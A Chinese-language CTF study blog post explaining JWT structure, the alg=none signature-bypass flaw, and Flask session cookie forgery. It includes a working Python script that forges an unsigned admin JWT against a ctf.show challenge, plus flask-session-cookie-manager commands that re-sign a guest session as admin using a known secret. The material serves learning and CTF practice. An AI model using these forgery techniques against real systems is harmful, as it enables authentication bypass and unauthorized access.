---
title: JWT：结构、alg=none 与 flask-session 伪造
date: 2026-11-22 08:07:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [JWT, 认证, Web]
description: JWT 的三段结构、alg=none 漏洞与 flask-session-cookie-manager 的用法。
toc: true
---

讲清 JWT 结构后，落到两个最常考的点：alg 置空绕过与 Flask session cookie 伪造。

## JWT的结构

### 1.什么是 JWT？

JWT 是一种用于 **身份认证** 和 **信息传输** 的 Token 格式，由三部分组成：

```text
Header.Payload.Signature
```

三部分之间用 `.` 分隔。

### 2. JWT 的三部分结构

#### **① Header（头部）**

描述 JWT 的元信息，例如使用的签名算法：

示例：

```text
{
  "alg": "HS256",
  "typ": "JWT"
}
```

常见参数：

| 字段 | 含义 |
| --- | --- |
| alg | 签名算法，如 HS256、RS256、none |
| typ | Token 类型，通常为 JWT |

编码方式：

```text
Header = Base64URL( JSON(Header) )
```

---

#### **② Payload（负载）**

Payload 是实际存储的内容（Claims），可以包含用户信息。

示例：

```text
{
  "user": "admin",
  "admin": true,
  "exp": 1712345678
}
```

常见字段：

| 字段 | 解释 |
| --- | --- |
| iss | 签发者（issuer） |
| sub | 用户标识（subject） |
| exp | 过期时间（expiration） |
| iat | 签发时间（issued at） |

注意：**Payload 不加密！任何人都能解码看到内容。**

编码方式：

```text
Payload = Base64URL( JSON(Payload) )
```

---

#### **③ Signature（签名）**

用于防止 Token 被篡改。

签名生成方式（HS256 例）：

```text
Signature = HMACSHA256( header_b64 + "." + payload_b64, secret )
```

JWT 最终结构：

```text
header_b64.payload_b64.signature
```

---

### 3. Base64URL 是什么？

JWT 使用 **Base64URL** 编码，不同于普通 Base64：

- 使用 URL 安全字符：`-` 代替 `+`，`_` 代替 `/`
- 结尾去掉 `=` 补位

例：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

---

### 4. JWT 验证流程（服务器）

1. 接收 JWT 字符串
2. 分成三段：header、payload、signature
3. Base64URL 解码 header 和 payload
4. 根据 header 中的 `alg` 选择签名算法
5. 用服务器的 `secret` 重算签名
6. 比较 signature 是否一致

   - 一致 → Token 有效
   - 不一致 → Token 无效

## alg=none 漏洞

#### **1. alg=none 漏洞**

如果服务器对 “none” 算法处理不当：

你可以构造：

```text
{"alg": "none"}
```

并让 signature 留空：

```text
header.payload.
```

→ 直接伪造管理员 token。

列题.ctfshow _web应用安全与防护

```text
import json
import base64
import requests

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

url="http://11fb4219-8cc1-4fc1-9d38-034696e03aed.challenge.ctf.show/"
header={"alg":"none","typ":"JWT"}
payload={"user":"admin","admin":True}

header_b64=base64url_encode(json.dumps(header).encode())
payload_b64=base64url_encode(json.dumps(payload).encode())

jwt_token=f"{header_b64}.{payload_b64}."

cookies={"token":jwt_token}
res=requests.get(url=url,cookies=cookies)

if "CTF{" in res.text:
    print("OK")
    star=res.text.find("CTF{")
    end=res.text.find("}",star)
    print(res.text[star:end+1])
```

## flask-session-cookie-manager使用

```text
D:\Download\flask-session-cookie-manager-master\flask-session-cookie-manager-master>python flask_session_cookie_manager3.py decode -c "eyJ1c2VybmFtZSI6Imd1ZXN0In0.aRnb1w.9M74PL2bw6RBk3FcUD5MA-XQ7R8" -s "18.743688974575345"
{'username': 'guest'}

D:\Download\flask-session-cookie-manager-master\flask-session-cookie-manager-master>python flask_session_cookie_manager3.py encode -t "{'username': 'admin'}" -s "18.743688974575345"
eyJ1c2VybmFtZSI6ImFkbWluIn0.aRnfxA.af-ilpIl7eIbAcO_HVgHpzNDWUo

D:\Download\flask-session-cookie-manager-master\flask-session-cookie-manager-master>
```
